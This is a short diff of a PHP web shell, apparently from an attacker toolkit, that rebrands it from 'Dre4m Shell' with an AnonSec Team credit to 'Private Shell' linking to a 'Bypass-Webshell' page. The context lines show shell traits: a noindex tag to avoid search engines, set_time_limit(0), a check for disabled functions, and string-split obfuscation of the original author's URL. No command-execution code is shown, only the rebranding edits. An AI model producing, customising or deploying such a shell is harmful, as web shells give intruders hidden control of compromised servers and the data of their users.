@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<?php echo "<title>Dre4m Was Here</title>"; ?>
+	<?php echo "<title>Private Web Shells</title>"; ?>
 	<meta name="robots" content="noindex">
 	<link rel="icon" href="https://brebes-bx.biz.id/bbx.jpg" type="image/x-icon">
 </head>
@@ -113,7 +113,7 @@ option {
 </style>
 <center>
 <?php
-echo '<font face="Bungee" size="5">Dre4m Shell</font></center>
+echo '<font face="Bungee" size="5">Private Shell</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
 set_time_limit(0);
@@ -159,7 +159,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>An"."on"."7 - 2"."02"."2<br><a href='https://sh"."el"."l.an"."ons"."ec-te"."am.org/' target='_blank'>An"."on"."Se"."c Te"."am</a></center>";
+	echo "<center><br><a href='https://sagsooz.github.io/Bypass-Webshell/'>Private WebShells</a></center>";
 	exit();
 }
 
